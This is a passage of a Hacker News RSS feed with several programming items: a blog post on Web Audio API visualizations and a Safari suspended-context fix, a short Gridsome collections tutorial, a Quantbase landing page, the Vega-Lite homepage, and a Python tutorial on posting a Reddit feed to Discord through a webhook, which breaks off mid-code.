<p>So I decided to add an audio-only mode. And if I was gonna do that, I had to show something cool in place of the video. So I figured I would try to add audio visualizations when one or both of the users didn’t have video on. Using the relatively recent<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Audio_API">Web Audio API</a> seemed like the right way to go.</p>
<p>Here’s what I came up with:</p>
<div><video controls="" muted="" autoplay="" playsinline="" loop=""><source src="https://media.dwayne.xyz/blog/audio-visualization.mp4" type="video/mp4"></video><p>Screen recording of the local audio visualization. I cycle through bar graph in light mode, bar graph in dark mode, sine wave in dark mode, then sine wave in light mode.</p></div>
<h2>Creating and hooking up an AnalyserNode</h2>
<p>To create audio visualizations, the first thing you’ll need is an <code>AnalyserNode</code>, which you can get from the <code>createAnalyser</code> method of a <code>BaseAudioContext</code>. You can get both of these things pretty easily<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> like this:</p>
<pre><span>1</span><span>const</span> audioContext <span>=</span> <span>new</span> <span>window</span>.AudioContext();
<span>2</span><span>const</span> analyser <span>=</span> audioContext.createAnalyser();
</pre><p>Next, create a <code>MediaStreamAudioSourceNode</code> from an existing data stream (I use either the local or remote data streams from either <code>getUserMedia</code> or from the ‘track’ event of <code>RTCPeerConnection</code> respectively) using <code>AudioContext.createMediaStreamSource</code>. Then you can connect that audio source to the analyser object like this:</p>
<pre><span>1</span><span>const</span> audioSource <span>=</span> <span>this</span>.audioContext.createMediaStreamSource(stream);
<span>2</span>audioSource.connect(analyser);
</pre>
<h2>Using requestAnimationFrame</h2>
<p><code>window.requestAnimationFrame</code> is nice. Call it, passing in your drawing function, and then inside that function call <code>requestAnimationFrame</code> again. Get yourself a nice little recursive loop going that’s automatically timed properly by the browser.</p>
<p>In my situation, there will either be 0, 1, or 2 visualizations running, since either side can choose either video chat, audio-only (…except during screen sharing), or just text chat. So I have one loop that draws both. It looks like this:</p>
<pre><span>1</span><span>const</span> drawAudioVisualizations <span>=</span> () =&gt; {
<span>2</span>    audioCancel <span>=</span> <span>window</span>.requestAnimationFrame(drawAudioVisualizations);
<span>3</span>    localAudioVisualization.draw();
<span>4</span>    remoteAudioVisualization.draw();
<span>5</span>};
</pre><p>I created the class for those visualization objects, and they handle whether or not to draw. They each contain the analyser, source, and context objects for their visualization.</p>
<p>Then when I detect that loop doesn’t have to run anymore, I can cancel it using that <code>audioCancel</code> value:</p>
<pre><span>1</span><span>window</span>.cancelAnimationFrame(audioCancel);
<span>2</span>audioCancel <span>=</span> <span>0</span>;
</pre>
<h2>Configuring the Analyser</h2>
<p>Like in the <a href="https://github.com/mdn/voice-change-o-matic/blob/gh-pages/scripts/app.js">example you’ll see a lot</a> if you look at the MDN documentation for this stuff, I provide options for two audio visualizations: frequency bars and a sine wave. Here’s how I configure the analyser for each type:</p>
<pre><span> 1</span><span>switch</span> (<span>this</span>.type) {
<span> 2</span>    <span>case</span> <span>'frequencybars'</span><span>:</span>
<span> 3</span>        <span>this</span>.analyser.minDecibels <span>=</span> <span>-</span><span>90</span>;
<span> 4</span>        <span>this</span>.analyser.maxDecibels <span>=</span> <span>-</span><span>10</span>;
<span> 5</span>        <span>this</span>.analyser.smoothingTimeConstant <span>=</span> <span>0.85</span>;
<span> 6</span>        <span>this</span>.analyser.fftSize <span>=</span> <span>256</span>;
<span> 7</span>        <span>this</span>.bufferLength <span>=</span> <span>this</span>.analyser.frequencyBinCount;
<span> 8</span>        <span>this</span>.dataArray <span>=</span> <span>new</span> Uint8Array(<span>this</span>.bufferLength);
<span> 9</span>        <span>break</span>;
<span>10</span>    <span>default</span><span>:</span>
<span>11</span>        <span>this</span>.analyser.minDecibels <span>=</span> <span>-</span><span>90</span>;
<span>12</span>        <span>this</span>.analyser.maxDecibels <span>=</span> <span>-</span><span>10</span>;
<span>13</span>        <span>this</span>.analyser.smoothingTimeConstant <span>=</span> <span>0.9</span>;
<span>14</span>        <span>this</span>.analyser.fftSize <span>=</span> <span>1024</span>;
<span>15</span>        <span>this</span>.bufferLength <span>=</span> <span>this</span>.analyser.fftSize;
<span>16</span>        <span>this</span>.dataArray <span>=</span> <span>new</span> Uint8Array(<span>this</span>.bufferLength);
<span>17</span>        <span>break</span>;
<span>18</span>}
</pre><div><p>I’ve adjusted these numbers a lot, and I’m gonna keep doing it. A note about <code>fftSize</code> and <code>frequencyBinCount</code>: <code>frequencyBinCount</code> is set right after you set <code>fftSize</code> and it’s usually just half the <code>fftSize</code> value. These values are about the amount of data you want to receive from the main analyser functions I’m about to talk about next. As you can see, they directly control the size of the data array that you’ll use to store the audio data on each draw call.
</p></div>
<h2>Using the Analyser</h2>
<p>On each draw call, depending on the type of visualization, call either <code>getByteFrequencyData</code> or <code>getByteTimeDomainData</code> with the array that was created above, and it’ll be filled with data. Then you run a simple loop over each element and start drawing. Here’s my sine wave code:</p>
<pre><span> 1</span><span>this</span>.analyser.getByteTimeDomainData(<span>this</span>.dataArray);
<span> 2</span><span>this</span>.ctx.lineWidth <span>=</span> <span>2</span>;
<span> 3</span><span>this</span>.ctx.strokeStyle <span>=</span> audioSecondaryStroke;
<span> 4</span>
<span> 5</span><span>this</span>.ctx.beginPath();
<span> 6</span>
<span> 7</span><span>let</span> v, y;
<span> 8</span><span>for</span> (<span>let</span> i <span>=</span> <span>0</span>; i <span>&lt;</span> <span>this</span>.bufferLength; i<span>++</span>) {
<span> 9</span>    v <span>=</span> <span>this</span>.dataArray[i] <span>/</span> <span>128.0</span>;
<span>10</span>    y <span>=</span> v <span>*</span> height <span>/</span> <span>2</span>;
<span>11</span>
<span>12</span>    <span>if</span> (i <span>===</span> <span>0</span>) {
<span>13</span>        <span>this</span>.ctx.moveTo(x, y);
<span>14</span>    } <span>else</span> {
<span>15</span>        <span>this</span>.ctx.lineTo(x, y);
<span>16</span>    }
<span>17</span>
<span>18</span>    x <span>+=</span> width <span>*</span> <span>1.0</span> <span>/</span> <span>this</span>.bufferLength;
<span>19</span>}
<span>20</span>
<span>21</span><span>this</span>.ctx.lineTo(width, height <span>/</span> <span>2</span>);
<span>22</span><span>this</span>.ctx.stroke();
</pre><div><p>The fill and stroke colors are dynamic based on the website color scheme.
</p></div>
<h2>Good ol' Safari</h2>
<p>So I did all of this stuff I just talked about, but for <strong>days</strong> I could <em>not</em> get this to work in Safari. Not because of errors or anything, but because both <code>getByteFrequencyData</code> and <code>getByteTimeDomainData</code> just filled the array with 0s every time. No matter what I did. I was able to get the audio data in Firefox just fine.</p>
<p>So at first, I figured it just didn’t work at all in Safari and I would just have to wait until Apple fixed it. But then I came across <a href="https://mdn.github.io/voice-change-o-matic/">this sample audio project</a> and noticed it worked just fine in Safari.</p>
<div><p>So I studied the code for an hour trying to understand what was different about my code and theirs. I made a lot of changes to my code to make it more like what they were doing. One of the big differences is that they’re connecting the audio source to different audio distortion nodes to actually change the audio. I just want to create a visualization so I wasn’t using any of those objects.
</p></div>
<h3>Audio Distortion Effects</h3>
<p>The <code>BaseAudioContext</code> has a few methods you can use to create audio distortion objects.</p>
<ul>
<li><code>WaveShaperNode</code>: Use <code>BaseAudioContext.createWaveShaper</code> to create a non-linear distortion. You can use a custom function to change the audio data.</li>
<li><code>GainNode</code>: Use <code>BaseAudioContext.createGain</code> to control the overall gain (volume) of the audio.</li>
<li><code>BiquadFilterNode</code>: Use <code>BaseAudioContext.createBiquadFilter</code> to apply some common audio effects.</li>
<li><code>ConvolverNode</code>: Use <code>BaseAudioContext.createConvolver</code> to apply reverb effects to audio.</li>
</ul>
<p>Each one of these objects has a <code>connect</code> function where you pass another context, output, or filter. Each one has a certain number of inputs and outputs. Here’s an example from that sample project of connecting all of them:</p>
<pre><span>1</span>source <span>=</span> audioCtx.createMediaStreamSource(stream);
<span>2</span>source.connect(distortion);
<span>3</span>distortion.connect(biquadFilter);
<span>4</span>biquadFilter.connect(gainNode);
<span>5</span>convolver.connect(gainNode);
<span>6</span>gainNode.connect(analyser);
<span>7</span>analyser.connect(audioCtx.destination);
</pre><p><strong>Note</strong>: Don’t connect to your audio context <code>destination</code> if you’re just trying to create a visualization for a call. The user will hear themselves talking.</p>
<div><p>Anyway, I tried adding these things to my code to see if that would get it working in Safari, but I had no luck.
</p></div>
<h2>Figuring out the Safari issue</h2>
<p>I was starting to get <em>real</em> frustrated trying to figure this out. I was gonna let it go when I thought Safari was just broken (because it usually is), but since I knew it <em>could</em> work in Safari, I couldn’t leave it alone.</p>
<p>Eventually I downloaded the actual HTML and Javascript files from that sample and started removing shit from their code, running it locally and seeing if it worked. Which it did. So now I’m editing my own code, and <em>their code</em>, to get them to be pretty much the same. Which I did. And <strong>still</strong> theirs worked and mine didn’t.</p>
<p>Next I just started desperately logging every single object at different points in my code to figure out what the fuck was going on. Then I noticed something.</p>
<div><p><img src="https://media.dwayne.xyz/blog/audio-context-suspended.png" alt="Dev console showing the output of logging this.audioContext. The state attribute is shown as suspended"></p><p>Output of logging the audio context object.</p></div>
<p>The <code>state</code> is “suspended”? Why? I don’t know. I did the same log in the sample code (that I had downloaded and was running on my machine) and it was “running”.</p>
<p>This is the code that fixes it:</p>
<pre><span>1</span><span>this</span>.audioSource <span>=</span> <span>this</span>.audioContext.createMediaStreamSource(<span>this</span>.stream);
<span>2</span><span>this</span>.audioSource.connect(<span>this</span>.analyser);
<span>3</span><span>this</span>.audioContext.resume(); <span>// Why??????
</span></pre><div><p>Calling <code>resume</code> changes the state and then everything works. To this day I still don’t know why the sample code didn’t need that line.
</p></div>
<h2>Drawing the image and supporting light/dark modes</h2>
<p>Like everything else on my site, all of this must support different color schemes (and screen sizes, and mobile devices). That was surprisingly difficult when trying to draw an SVG on the canvas.</p>
<p>I’m using <a href="https://fontawesome.com/">FontAwesome</a> for all my icons on the site. I wanted to use one of them for these visualizations. The FontAwesome files are all SVGs (which is great), but I didn’t know how to draw the image in different colors in Javascript. The way I decided to do this was to load the SVG file into a Javascript <code>Image</code> object, then draw that onto the canvas each draw call.</p>
<p>That worked, but it only drew it black even after changing the fill and stroke colors. So after some web searching I read about someone deciding to draw out an image on an offscreen canvas, reading all the image data, and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dwayne.xyz/post/audio-visualizations-web-audio-api">https://dwayne.xyz/post/audio-visualizations-web-audio-api</a></em></p>]]>
            </description>
            <link>https://dwayne.xyz/post/audio-visualizations-web-audio-api</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938292</guid>
            <pubDate>Fri, 30 Oct 2020 01:55:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create Collections from API with Gridsome]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938194">thread link</a>) | @phongduong
<br/>
October 29, 2020 | https://phongduong.dev/blog/create-collections-from-api-with-gridsome/ | <a href="https://web.archive.org/web/*/https://phongduong.dev/blog/create-collections-from-api-with-gridsome/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Gridsome provides many source plugins that help you create collections from your source. But if you want to create collections from your API or a third-party API, you have to create collections manually. </p>
<p>In <code>gridsome.server.js</code> file, you call <code>loadSource</code> method of <code>api</code> parameter. You pass a callback function which you will fetch the API and create collections from data.</p>
<p>Your callback has an <code>actions</code> parameter, it has <code>addCollection</code> method. You will use this method to create your collections</p>
<pre><code><span>const</span> axios <span>=</span> <span>require</span><span>(</span><span>"axios"</span><span>)</span>

module<span>.</span><span>exports</span> <span>=</span> <span>function</span><span>(</span><span>api</span><span>)</span> <span>{</span>
  api<span>.</span><span>loadSource</span><span>(</span><span>actions</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>{</span> data <span>}</span> <span>=</span> <span>await</span> axios<span>.</span><span>get</span><span>(</span><span>'https://example.com/api/v1/posts'</span><span>)</span>
    <span>const</span> postCollection <span>=</span> actions<span>.</span><span>addCollection</span><span>(</span><span>"Post"</span><span>)</span>
    
    <span>for</span><span>(</span><span>const</span> post <span>of</span> data<span>)</span> <span>{</span>
      postCollection<span>.</span><span>addNode</span><span>(</span><span>{</span>
        id<span>:</span> post<span>.</span><span>id</span><span>,</span>
        title<span>:</span> post<span>.</span><span>title</span>
      <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span><span>;</span></code></pre>
<p>After you start the server, it will create <code>Post</code> collection. To get the collection, you call <code>getCollection</code> method with the collection's name</p>
<pre><code>actions<span>.</span><span>getCollection</span><span>(</span><span>"Post"</span><span>)</span></code></pre>
</div></div>]]>
            </description>
            <link>https://phongduong.dev/blog/create-collections-from-api-with-gridsome/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938194</guid>
            <pubDate>Fri, 30 Oct 2020 01:32:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quantbase – Deploy your own algo trader in 5 minutes with 0 code]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938082">thread link</a>) | @tjs8rj
<br/>
October 29, 2020 | https://areyouinterested.co/site/quantbase/ | <a href="https://web.archive.org/web/*/https://areyouinterested.co/site/quantbase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="hero-1"><p id="subheading">Deploy algorithms from top hedge funds,<br> rank and use 100s of users’ algorithms,<br> or create new algo-traders effortlessly</p>

              <div id="interested">
                <h3>Are you interested?</h3>
                <div id="buttons">
                  <p><a href="https://areyouinterested.co/site/quantbase/yes" id="yes">Yes</a>
                  <a href="https://areyouinterested.co/site/quantbase/no" id="no">No</a>
                </p></div>
              </div>

            </div></div>]]>
            </description>
            <link>https://areyouinterested.co/site/quantbase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938082</guid>
            <pubDate>Fri, 30 Oct 2020 01:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vega-Lite: A Grammar of Interactive Graphics]]>
            </title>
            <description>
<![CDATA[
Score 227 | Comments 50 (<a href="https://news.ycombinator.com/item?id=24937954">thread link</a>) | @tosh
<br/>
October 29, 2020 | https://vega.github.io/vega-lite/ | <a href="https://web.archive.org/web/*/https://vega.github.io/vega-lite/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <section>
    <p>
  <strong>Vega-Lite</strong> is a high-level grammar of interactive graphics. It provides a concise, declarative JSON syntax to create an expressive range of visualizations for data analysis and presentation.
</p>

<p><span>
  <span>
    Vega-Lite specifications describe visualizations as encoding mappings from data to <strong>properties of graphical marks</strong> (e.g., points or bars).
    The Vega-Lite compiler <strong>automatically produces visualization components</strong> including axes, legends, and scales.
    It determines default properties of these components based on a set of <strong>carefully designed rules</strong>.
    This approach allows Vega-Lite specifications to be concise for quick visualization authoring, while giving user control to override defaults and customize various parts of a visualization.
    As we also designed Vega-Lite to support data analysis, Vega-Lite supports both <strong>data transformations</strong> (e.g., aggregation, binning, filtering, sorting) and <strong>visual transformations</strong> (e.g., stacking and faceting).
    Moreover, Vega-Lite specifications can be <strong>composed</strong> into layered and multi-view displays, and made <strong>interactive with selections</strong>.
  </span>
  <span>
  <a href="https://vega.github.io/vega-lite/tutorials/getting_started.html">Get started<br><small>Latest Version: 4.17.0</small></a>
  <a href="https://vega.github.io/editor/#/custom/vega-lite">Try online</a>
  </span>
</span></p>

<p>Compared to <a href="https://vega.github.io/vega">Vega</a>, Vega-Lite provides a more concise and convenient form to author common visualizations. As Vega-Lite can compile its specifications to Vega specifications, users may use Vega-Lite as the <em>primary</em> visualization tool and, if needed, transition to use the lower-level Vega for advanced use cases.</p>

<p>For more information, read our <a href="https://medium.com/@uwdata/de6661c12d58">introduction article to Vega-Lite v2 on Medium</a>, watch our <a href="https://www.youtube.com/watch?v=9uaHRWj04D4">OpenVis Conf talk about the new features in Vega-Lite v2</a>, see the <a href="https://vega.github.io/vega-lite/docs/">documentation</a> and take a look at our <a href="https://vega.github.io/vega-lite/examples/">example gallery</a>. Follow us on <a href="https://twitter.com/vega_vis">Twitter at @vega_vis</a> to stay informed about updates.</p>

<h2 id="example">Example</h2>



<h2 id="additional-links">Additional Links</h2>

<ul>
  <li>Award winning <a href="https://idl.cs.washington.edu/papers/vega-lite">research paper</a> and <a href="https://www.youtube.com/watch?v=9uaHRWj04D4">video of our OpenVis Conf talk</a> on the design of Vega-Lite</li>
  <li>Listen to a Data Stories episode about <a href="http://datastori.es/121-declarative-visualization-with-vega-lite-and-altair-with-dominik-moritz-jacob-vanderplas-kanit-ham-wongsuphasawat/">Declarative Visualization with Vega-Lite and Altair</a>
</li>
  <li>
<a href="http://json-schema.org/">JSON schema</a> specification for <a href="https://github.com/vega/schema">Vega-Lite</a> (<a href="https://vega.github.io/schema/vega-lite/v4.json">latest</a>)</li>
  <li>Ask questions about Vega-Lite on <a href="https://stackoverflow.com/tags/vega-lite">Stack Overflow</a> or <a href="https://bit.ly/join-vega-slack-2020">Slack</a>
</li>
  <li>Fork our <a href="https://bl.ocks.org/domoritz/455e1c7872c4b38a58b90df0c3d7b1b9">Vega-Lite Block</a>, or <a href="https://beta.observablehq.com/@domoritz/vega-lite-demo">Observable Notebook</a>.</li>
</ul>

<h2 id="users">Users</h2>

<p>Vega-Lite is used by thousands of data enthusiasts, developers, journalists, data scientists, teachers, and researchers across many organizations. Here are some of them. Learn about integrations on our <a href="https://vega.github.io/vega-lite/ecosystem.html">ecosystem page</a>.</p>



<h2 id="team">Team</h2>

<p>The development of Vega-Lite is led by the alumni and members of the <a href="https://idl.cs.washington.edu/">University of Washington Interactive Data Lab</a> (UW IDL), including <a href="https://twitter.com/kanitw">Kanit “Ham” Wongsuphasawat</a> (now at Apple), <a href="https://twitter.com/domoritz">Dominik Moritz</a> (now at CMU / Apple), <a href="https://twitter.com/arvindsatya1">Arvind Satyanarayan</a> (now at MIT), and <a href="https://twitter.com/jeffrey_heer">Jeffrey Heer</a> (UW IDL).</p>

<p>Vega-Lite gets significant contributions from its community–in particular <a href="https://willium.com/">Will Strimling</a>, <a href="https://github.com/YuhanLu">Yuhan (Zoe) Lu</a>, <a href="https://github.com/invokesus">Souvik Sen</a>, <a href="https://github.com/chanwutk">Chanwut Kittivorawong</a>, <a href="https://github.com/mattwchun">Matthew Chun</a>, <a href="https://github.com/AkshatSh">Akshat Shrivastava</a>, <a href="https://github.com/Saba9">Saba Noorassa</a>, <a href="https://github.com/sirahd">Sira Horradarn</a>, <a href="https://github.com/donghaoren">Donghao Ren</a>, and <a href="https://github.com/haldenl">Halden Lin</a>. Please see the <a href="https://github.com/vega/vega-lite/graphs/contributors">contributors page</a> for the full list of contributors.</p>

  </section>
</div></div>]]>
            </description>
            <link>https://vega.github.io/vega-lite/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24937954</guid>
            <pubDate>Fri, 30 Oct 2020 00:52:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Adding a simple Reddit feed to your Discord with Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24937851">thread link</a>) | @DanWritesCode
<br/>
October 29, 2020 | https://danwalker.com/python-discord-reddit-feed/ | <a href="https://web.archive.org/web/*/https://danwalker.com/python-discord-reddit-feed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <main aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>I’m a moderator of many Discords, and I run a lot of bots and scripts to help manage and improve communities. It’s pretty common for larger subreddits to have a Discord server these days, and for that reason, today we’re going to be looking at a useful feature for both users and moderators alike: adding a Reddit feed to your Discord server.</p> <h2 id="what-well-be-doing"> <a href="#what-well-be-doing"></a> What we’ll be doing </h2> <p>We’re going to create a separate channel in our Discord server, and receive updates about any new posts within a given subreddit. We’ll be using /r/discordapp for this post. We’ll create a Python script to do the work for us, and this script will need to live somewhere (such as a <a href="https://m.do.co/c/f24e8a65668a">Digital Ocean VPS</a> - click for free credit).</p> <h3 id="create-a-discord-channel-and-webhook"> <a href="#create-a-discord-channel-and-webhook"></a> Create a Discord channel and webhook </h3> <p>For this example, we will first create a new channel called <code>#reddit-feed</code>, with read-only permissions for everyone:</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-new-channel.png" alt="Discord channel creation"></p> <p>Once created, open the settings page for the new channel, and then select the Integrations section from the left menu:</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/webhook-create.png" alt="Discord channel editing"></p> <p>Finally, create a new webhook. You can call it whatever you’d like, I’ll simply name it <code>Reddit Feed</code> for this example. Be sure to save your changes, and voila! We can visit this page any time to copy our webhook URL.</p> <p>Let’s test out our new webhook from the terminal, before we get started with code.</p> <div><div><pre><code>$ export WEBHOOK_URL="https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$ curl -X POST -H "Content-Type: application/json" -d '{"username": "Hello", "content": "World"}' $WEBHOOK_URL
</code></pre></div></div> <p>Success!</p> <p><img src="https://danwalker.com/python-discord-reddit-feed/discord-message.png" alt="Discord message"></p> <h3 id="fetching-posts"> <a href="#fetching-posts"></a> Fetching posts </h3> <p>Now let’s start our actual Python code, we’ll begin by fetching a list of posts from Reddit. Luckily, Reddit makes this quite easy as you can append <code>.json</code> to most URLs to receive a JSON formatted response, for example: <code>https://www.reddit.com/r/discordapp/new/.json</code> which will return the 25 newest posts from /r/discordapp.</p> <p>Let’s fetch it with Python</p> <div><div><pre><code><span>import</span> <span>requests</span>

<span>subreddit</span> <span>=</span> <span>'discordapp'</span>

<span>req</span> <span>=</span> <span>requests</span><span>.</span><span>get</span><span>(</span><span>f'https://www.reddit.com/r/</span><span>{</span><span>subreddit</span><span>}</span><span>/new/.json'</span><span>,</span> <span>headers</span><span>=</span><span>{</span>
    <span>"Cache-Control"</span><span>:</span> <span>"no-cache"</span><span>,</span>
    <span>"Pragma"</span><span>:</span> <span>"no-cache"</span><span>,</span>
    <span>"User-Agent"</span><span>:</span> <span>"discord-feed-bot"</span><span>})</span>

<span>posts</span> <span>=</span> <span>req</span><span>.</span><span>json</span><span>()[</span><span>'data'</span><span>][</span><span>'children'</span><span>]</span>

<span>for</span> <span>post</span> <span>in</span> <span>posts</span><span>:</span>
    <span>print</span><span>(</span><span>f"Found post: </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>]</span><span>}</span><span>"</span><span>)</span>

</code></pre></div></div> <p>First of all we load the <code>requests</code> library for fetching data from Reddit.</p> <p>Next we store the subreddit in a variable, and send a request to Reddit for the JSON of the latest posts. We use some headers here to make sure we avoid cache, and it’s also good practice to set a user-agent that identifies the creator - you could put an invite link to your Discord here, or similar.</p> <p>We then loop through the individual posts, which are stored within the <code>posts &gt; data &gt; children</code> of the returned JSON.</p> <p>Running the above should give an output similar to this:</p> <div><div><pre><code>Found post: Discord logged me out and is now telling me that my email doesn't exist
Found post: any ETA for Wayland support?
Found post: Is there a way to change a discord server's "permanent" invite link?
Found post: Discord's app breaking in an odd way. Send help.

[output truncated]
</code></pre></div></div> <h2 id="only-showing-new-posts"> <a href="#only-showing-new-posts"></a> Only showing new posts </h2> <p>Now, the problem is, every time we run the above script we will grab all the new posts, regardless of whether or not we’ve seen them before. If we run this script as a one-minute cronjob, 25 posts will be repeatedly found each time.</p> <p>There are many ways to deal with this, for example if we know we’ll be running this script every minute, we could check the <code>post['data']['created']</code> timestamp and check whether or not the post was created in the last minute and then display it. This approach may miss posts if our cronjob fails for any reason, or the server running it reboots, so we could use a cache instead to help get round this.</p> <p>By storing a list of post IDs we have already discovered, we can avoid sending duplicate messages, and it doesn’t matter if the script doesn’t run for a short while.</p> <h3 id="caching-locally"> <a href="#caching-locally"></a> Caching locally </h3> <p>We’ll store a list of seen post IDs in a file. Let’s add a block of code at the top to check whether the file exists and load the data if so:</p> <div><div><pre><code><span>import</span> <span>json</span>

<span>try</span><span>:</span>
    <span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>)</span> <span>as</span> <span>json_file</span><span>:</span>
        <span>db</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>json_file</span><span>)</span>
<span>except</span> <span>FileNotFoundError</span><span>:</span>
    <span>db</span> <span>=</span> <span>[]</span>
</code></pre></div></div> <p>Now we have a <code>db</code> list, which is either a list of post IDs we’ve already seen, or an empty list (because we haven’t seen any before). We’ll add any new IDs to this list later, and save it, with this block at the end of our script:</p> <div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>,</span> <span>'w'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
    <span>json</span><span>.</span><span>dump</span><span>(</span><span>db</span><span>,</span> <span>outfile</span><span>,</span> <span>indent</span><span>=</span><span>2</span><span>)</span>
</code></pre></div></div> <h3 id="checking-whether-posts-are-unique"> <a href="#checking-whether-posts-are-unique"></a> Checking whether posts are unique </h3> <p>We only need to store a single piece of uniquely identifying information for each post, and for that we can use the <code>name</code> field which will have a format like <code>t3_abcde1</code>. Let’s modify our loop to look like this:</p> <div><div><pre><code><span>for</span> <span>post</span> <span>in</span> <span>posts</span><span>:</span>
    <span>if</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'name'</span><span>]</span> <span>not</span> <span>in</span> <span>db</span><span>:</span>
        <span>print</span><span>(</span><span>f"New post: </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>]</span><span>}</span><span>"</span><span>)</span>
        <span>db</span><span>.</span><span>append</span><span>(</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'name'</span><span>])</span>
</code></pre></div></div> <p>We should now have some output that looks like this:</p> <div><div><pre><code>Dans-MacBook-Pro:Desktop dwalker$ python3 test.py 
New post: Mic Distortion In Voice Calls and Mic Test
New post: Did anyone get that survey pop up?
...
[output truncated]
...
New post: Why is my phone number being listed as invalid when I have not used it for anything?
New post: Is there a way to get admin if you lost it?
Dans-MacBook-Pro:Desktop dwalker$ python3 test.py 
Dans-MacBook-Pro:Desktop dwalker$ cat db.json 
[
  "t3_jiqtfg",
  "t3_jiqoqr",
  ...
  [output truncated]
  ...
  "t3_jinmi4",
  "t3_jinbaj"
]Dans-MacBook-Pro:Desktop dwalker$ 
</code></pre></div></div> <p>Notice in the above example, on the second run of the script, no new posts were found, meaning our cache is working as expected.</p> <h3 id="limiting-the-cache-size"> <a href="#limiting-the-cache-size"></a> Limiting the cache size </h3> <p>One thing to note, as it’s good practice to always think about scaling and future growth, is that our cache will grow infinitely with post IDs. In order to fix this, we can limit how much we store in our cache.</p> <p>This is a simple fix, instead of dumping the entire <code>db</code> list to the output file, let’s just add the last 50 elements, by using <code>db[-50:]</code>. We can reference a list element from the end of a list, using negative numbers. By using a colon, we’re telling Python we want that element, and every element until the end of the list.</p> <p>Why 50? Reddit will return 25 new posts, however, if some get deleted then we may display duplicates when older posts re-appear on the <code>/new/.json</code> page, so we’ll store an extra page worth as a buffer.</p> <p>Our new output block looks like:</p> <div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>'db.json'</span><span>,</span> <span>'w'</span><span>)</span> <span>as</span> <span>outfile</span><span>:</span>
    <span>json</span><span>.</span><span>dump</span><span>(</span><span>db</span><span>[</span><span>-</span><span>50</span><span>:],</span> <span>outfile</span><span>,</span> <span>indent</span><span>=</span><span>2</span><span>)</span>
</code></pre></div></div> <h2 id="posting-to-discord"> <a href="#posting-to-discord"></a> Posting to Discord </h2> <p>Now we’ve got a script that works nicely in the terminal, let’s get it posting to the Discord webhook we created earlier. To create a nice embed, we’re going to use the <code>discord_webhook</code> library, which can be installed with <code>pip install discord_webhook</code> (or <code>pip3</code>, depending on your setup). We’ll import the bits we need at the top of our file with:</p> <div><div><pre><code><span>from</span> <span>discord_webhook</span> <span>import</span> <span>DiscordWebhook</span><span>,</span> <span>DiscordEmbed</span>

<span>webhook_url</span> <span>=</span> <span>"https://discord.com/api/webhooks/..."</span>
</code></pre></div></div> <p>Replace the above URL with your webhook URL you created earlier.</p> <h3 id="building-the-embed"> <a href="#building-the-embed"></a> Building the embed </h3> <p>Our current loop simply prints out the name of the new post in the terminal. We could simply post the title to Discord, but Discord supports rich embeds - so why not make use of them?</p> <p>Reddit posts come in three formats: text, image, and video. We know a post is a text post if the <code>thumbnail</code> property is set to <code>self</code>. Posts also contain a handy <code>is_video</code> property which identify video posts, and if a post matches neither of these then it’s an image post.</p> <p>Unfortunately, Discord doesn’t currently support embedding videos that are playable within the chat client, so we’ll use the thumbnail and add some information to show that the post is a video.</p> <div><div><pre><code><span>webhook</span> <span>=</span> <span>DiscordWebhook</span><span>(</span><span>url</span><span>=</span><span>webhook_url</span><span>)</span>

<span>permalink</span> <span>=</span> <span>f"https://www.reddit.com</span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'permalink'</span><span>]</span><span>}</span><span>"</span>

<span>if</span> <span>post</span><span>[</span><span>'data'</span><span>][</span><span>'thumbnail'</span><span>]</span> <span>==</span> <span>'self'</span><span>:</span> <span># text post
</span>    <span>embed</span> <span>=</span> <span>DiscordEmbed</span><span>(</span><span>title</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'title'</span><span>],</span> <span>url</span><span>=</span><span>permalink</span><span>,</span> <span>description</span><span>=</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'selftext'</span><span>])</span>
    <span>embed</span><span>.</span><span>set_footer</span><span>(</span><span>text</span><span>=</span><span>f"Posted by </span><span>{</span><span>post</span><span>[</span><span>'data'</span><span>][</span><span>'author'</span><span>]</span><span>}</span><span>"</span><span>)</span>

